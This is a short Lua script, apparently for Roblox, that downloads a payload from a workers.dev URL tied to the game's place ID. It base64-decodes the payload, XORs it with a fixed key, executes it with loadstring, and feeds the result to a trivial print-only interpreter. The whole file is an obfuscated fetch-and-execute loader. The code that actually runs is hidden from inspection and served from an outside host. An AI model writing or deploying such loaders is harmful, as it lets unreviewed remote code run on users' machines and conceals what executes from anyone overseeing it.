local URL = "https://animedice.xinneflex.workers.dev/?placeId=" .. game.PlaceId
local KEY = 37
local B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function base64decode(s)
    s = s:gsub("%s+", "")
    local out = {}

    for i = 1, #s, 4 do
        local a = (B64:find(s:sub(i, i), 1, true) or 1) - 1
        local b = (B64:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
        local c = (B64:find(s:sub(i + 2, i + 2), 1, true) or 1) - 1
        local d = (B64:find(s:sub(i + 3, i + 3), 1, true) or 1) - 1
        local n = a * 262144 + b * 4096 + c * 64 + d

        out[#out + 1] = string.char(math.floor(n / 65536) % 256)

        if s:sub(i + 2, i + 2) ~= "=" then
            out[#out + 1] = string.char(math.floor(n / 256) % 256)
        end

        if s:sub(i + 3, i + 3) ~= "=" then
            out[#out + 1] = string.char(n % 256)
        end
    end

    return table.concat(out)
end

local function xor(a, b)
    local result = 0
    local bit = 1

    while a > 0 or b > 0 do
        if a % 2 ~= b % 2 then
            result = result + bit
        end
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        bit = bit * 2
    end

    return result
end

local payload = game:HttpGet(URL)
local encoded = base64decode(payload)
local decoded = {}

for i = 1, #encoded do
    decoded[i] = string.char(xor(string.byte(encoded, i), KEY))
end

local bytecode = assert(loadstring(table.concat(decoded)))()
local pc = 1

while true do
    local op = bytecode[pc]

    if op == 0 then
        break
    elseif op == 1 then
        print(bytecode[pc + 1])
        pc = pc + 2
    else
        error("Unknown opcode: " .. tostring(op))
    end
end
